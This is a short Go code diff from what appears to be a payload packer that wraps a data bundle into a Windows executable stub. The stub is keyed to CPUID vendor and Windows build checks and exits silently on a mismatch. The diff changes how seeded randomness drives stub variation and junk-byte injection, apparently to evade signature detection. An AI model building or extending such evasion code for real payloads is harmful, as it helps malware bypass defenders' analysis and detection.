@@ -217,13 +217,17 @@ func WrapBundleAsExecutableWindowsWithSeed(bundle []byte, profile BundleProfile,
 	// per-entry test honors PT_CPUID_VENDOR, PT_WIN_BUILD range
 	// check, and the negate flag XOR. On no-match, jumps to the §2
 	// EmitNtdllRtlExitUserProcess(0) block embedded inline.
-	stub, _, err := bundleStubV2NegateWinBuildWindows()
+	var bRng, aRng *mathrand.Rand
+	if seed != 0 {
+		bRng = mathrand.New(mathrand.NewSource(seed))
+		aRng = mathrand.New(mathrand.NewSource(seed ^ 0x5a5a5a5a5a5a5a5a))
+	}
+	stub, _, err := bundleStubV2NegateWinBuildWindowsRng(bRng)
 	if err != nil {
 		return nil, err
 	}
-	if seed != 0 {
-		rng := mathrand.New(mathrand.NewSource(seed))
-		stub = injectStubJunk(stub, rng)
+	if aRng != nil {
+		stub = injectStubJunk(stub, aRng)
 	}
 	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
 	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)
